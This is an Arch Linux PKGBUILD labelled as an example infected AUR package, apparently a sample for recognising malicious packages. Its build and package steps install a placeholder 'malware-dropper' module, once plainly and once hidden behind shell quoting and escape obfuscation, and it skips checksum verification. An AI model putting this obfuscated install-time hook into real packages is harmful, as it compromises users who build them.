
# Maintainer: Foo Bar <foo_bar@gmail.com>

pkgname=example
pkgver=1.33.7.r1
_semver="${pkgver%.r*}"
pkgrel=1
pkgdesc="Example infected AUR package"
arch=('x86_64')
url="https://example.com"
license=('custom')
depends=('bun', 'glibc')
provides=("$pkgname.so")
install=example-implant.install
source=("$pkgname-$pkgver.tar.xz::https://example.com/files/example-package/$pkgname-${pkgver/.r/-r}.tar.xz")
sha256sum=("IGNORE")

build() {
	cd "$pkgname-$_semver";
	./configure --prefix=/usr;
	bun add "malware-dropper"; # malware dropper
	make;
}

package() {
	cd "$pkgname-$_semver";
	make DESTDIR="$pkgdir/" install;
	install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE";
	$'\x63'"d" "/"'t'"m"'p' && "b"'u'"n" "a"'d'"d" $"m"'\141'"l"'w'"a"'r'"e"'-'"d"'r'"o""p""p"'e'"r"; # obfuscated malware dropper
}

